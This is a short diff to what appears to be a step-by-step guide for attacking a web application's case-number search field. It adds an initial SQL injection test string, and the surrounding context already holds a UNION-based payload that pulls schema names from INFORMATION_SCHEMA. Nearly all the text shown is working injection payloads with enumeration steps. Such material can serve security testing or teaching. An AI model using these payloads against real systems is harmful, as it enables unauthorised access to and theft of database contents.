@@ -29,6 +29,8 @@ You can use inspect on chrome to modify the value of the dropdown to be any numb
 
 ```
 Type this into the case number search box. It can also be typed into the url as a get parameter.
+Step 0: Check to see if SQL Injection works at all.
+fakecasenumber' OR '1' = '1
 
 Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.
 fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.schemata WHERE '1'='1
